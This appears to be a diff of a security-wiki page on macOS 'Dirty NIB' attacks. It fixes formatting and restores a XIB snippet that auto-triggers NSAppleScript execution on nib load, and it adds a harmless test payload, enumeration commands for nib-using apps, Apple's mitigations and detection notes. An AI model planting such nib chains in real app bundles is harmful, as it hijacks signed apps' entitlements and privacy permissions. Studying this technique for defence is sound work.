@@ -1,6 +1,5 @@
 # macOS Dirty NIB
 
-
 Dirty NIB refers to abusing Interface Builder files (.xib/.nib) inside a signed macOS app bundle to execute attacker-controlled logic inside the target process, thereby inheriting its entitlements and TCC permissions. This technique was originally documented by xpn (MDSec) and later generalized and significantly expanded by Sector7, who also covered Apple’s mitigations in macOS 13 Ventura and macOS 14 Sonoma. For background and deep dives, see the references at the end.
 
 > TL;DR
@@ -29,29 +28,29 @@ The classic pre‑Ventura flow:
 Minimal example of an auto‑trigger chain inside a .xib (abridged for clarity):
 ```xml
 <objects>
-  
-  
+  <customObject id="A1" customClass="NSAppleScript"/>
+  <textField id="A2" title="display dialog \"PWND\""/>
   <!-- Menu item that will call -initWithSource: on NSAppleScript with A2.title -->
   <menuItem id="C1">
     <connections>
-      
-      
-      
+      <binding name="target" destination="A1"/>
+      <binding name="selector" keyPath="initWithSource:"/>
+      <binding name="Argument" destination="A2" keyPath="title"/>
     </connections>
   </menuItem>
   <!-- Menu item that will call -executeAndReturnError: on NSAppleScript -->
   <menuItem id="C2">
     <connections>
-      
-      
+      <binding name="target" destination="A1"/>
+      <binding name="selector" keyPath="executeAndReturnError:"/>
     </connections>
   </menuItem>
   <!-- Triggers that auto‑press the above menu items at load time -->
-  
-  
+  <menuItem id="T1"><connections><binding keyPath="_corePerformAction" destination="C1"/></connections></menuItem>
+  <menuItem id="T2"><connections><binding keyPath="_corePerformAction" destination="C2"/></connections></menuItem>
 </objects>
 ```
-```This achieves arbitrary AppleScript execution in the target process upon nib load. Advanced chains can:
+This achieves arbitrary AppleScript execution in the target process upon nib load. Advanced chains can:
 - Instantiate arbitrary AppKit classes (e.g., `NSTask`) and call zero‑argument methods like `-launch`.
 - Call arbitrary selectors with object arguments via the binding trick above.
 - Load AppleScriptObjC.framework to bridge into Objective‑C and even call selected C APIs.
@@ -64,7 +63,6 @@ Example AppleScript payload for a visible test:
 ```applescript
 set theDialogText to "PWND"
 display dialog theDialogText
-```
 ```
 
 ## Modern macOS protections (Ventura/Monterey/Sonoma/Sequoia)
@@ -95,15 +93,15 @@ find /Applications -maxdepth 2 -name Info.plist -exec sh -c \
   'for p; do if /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" >/dev/null 2>&1; \
    then echo "[+] $(dirname "$p") uses NSMainNibFile=$( /usr/libexec/PlistBuddy -c "Print :NSMainNibFile" "$p" )"; fi; done' sh {} +
 ```
-```- Find candidate nib resources inside a bundle:
+- Find candidate nib resources inside a bundle:
 ```bash
 find target.app -type f \( -name "*.nib" -o -name "*.xib" \) -print
 ```
-```- Validate code signatures deeply (will fail if you tampered with resources and didn’t re‑sign):
+- Validate code signatures deeply (will fail if you tampered with resources and didn’t re‑sign):
 ```bash
 codesign --verify --deep --strict --verbose=4 target.app
 ```
-```
+
 > Note: On modern macOS you will also be blocked by bundle protection/TCC when trying to write into another app’s bundle without proper authorization.
 
 ## Detection and DFIR tips
